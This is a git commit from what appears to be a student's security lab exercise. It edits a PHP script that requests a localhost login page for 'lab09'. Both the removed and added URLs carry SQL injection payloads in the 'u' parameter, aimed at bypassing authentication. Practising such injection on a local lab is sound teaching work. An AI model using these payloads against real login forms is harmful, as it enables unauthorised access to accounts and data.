c8033395e4f32e530facd46245fc5ce33f23c9d6
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-09 17:31:44 +0200

    t

--- script.php
+++ script.php
@@ -1,9 +1,9 @@
 <?php
-   $url="http://localhost/lab09/login.php?u=\"%20or%201%20--%20";
+   $url="http://localhost/lab09/login.php?u=\"%27admin%27%20--%20";
    $result = file_get_contents($url);
 
    print($result);
-   
+
    echo "\n"
 
 ?>
